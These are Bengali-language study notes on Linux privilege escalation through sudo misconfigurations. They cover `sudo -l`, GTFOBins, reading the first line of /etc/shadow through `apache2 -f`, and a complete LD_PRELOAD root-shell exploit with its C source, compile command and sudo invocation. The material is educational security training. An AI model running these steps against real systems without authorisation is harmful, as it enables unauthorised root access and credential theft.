# Privilege Escalation: Sudo

## Sudo

`sudo` command দিয়ে program root privilege-এ চালানো যায়।

কখনো Administrator সাধারণ user-কে নির্দিষ্ট কিছু command root privilege-এ চালানোর অনুমতি দেয়, কিন্তু পুরো system-এ root access দেয় না।

উদাহরণ: Junior SOC Analyst-কে শুধু `Nmap` root privilege-এ চালানোর অনুমতি দেওয়া হতে পারে।

নিজের sudo permission check:

```
sudo -l
```

কোনো program-এর sudo permission কীভাবে abuse করা যায় জানতে:

[GTFOBins](https://gtfobins.github.io/?utm_source=chatgpt.com)

## 1. Leverage Application Functions

কিছু application-এর পরিচিত exploit না থাকলেও তার built-in function ব্যবহার করে information leak করা যায়।

উদাহরণ: `Apache2`

Apache2-এর `-f` option দিয়ে alternative configuration file specify করা যায়।

```
apache2 -f /etc/shadow
```

এতে error message-এর মধ্যে `/etc/shadow` file-এর প্রথম line দেখা যেতে পারে।


## 2. Leverage LD_PRELOAD

`LD_PRELOAD` হলো environment option, যা program চালানোর আগে shared library load করতে দেয়।

যদি sudo configuration-এ `env_keep` option enabled থাকে, তাহলে নিজের তৈরি shared library program-এর আগে load ও execute করানো সম্ভব।

Note: Real User ID ও Effective User ID আলাদা হলে `LD_PRELOAD` option ignore করা হবে।

### Privilege Escalation Steps

1. `env_keep` সহ `LD_PRELOAD` enabled আছে কি না check করা।
2. Simple C code লিখে `.so` shared object তৈরি করা।
3. `sudo` দিয়ে program চালানোর সময় `LD_PRELOAD`-এ নিজের `.so` file দেওয়া।

C code — `shell.c`:

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

এই code root shell spawn করে।

Shared object compile:

```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```


Sudo দিয়ে execute:

```
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```

এখানে `find`-এর পরিবর্তে sudo permission থাকা অন্য program-ও ব্যবহার করা যাবে, যেমন `Apache2`।

ফলে root privilege-এ shell পাওয়া যাবে।

Reference: [LD_PRELOAD Dynamic Linker Tricks](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/?utm_source=chatgpt.com)

### Quick Revision

| Method                | কীভাবে কাজ করে                                              |
| --------------------- | ----------------------------------------------------------- |
| `sudo -l`             | User-এর sudo permissions দেখায়                              |
| GTFOBins              | Sudo permission থাকা program abuse করার technique           |
| Application Functions | Application-এর built-in option ব্যবহার করে information leak |
| `LD_PRELOAD`          | নিজের shared library আগে load করে root shell পাওয়া          |

মনে রাখবে: `LD_PRELOAD` abuse করতে sudo configuration-এ `env_keep` থাকতে হবে এবং Real UID ও Effective UID একই হতে হবে।
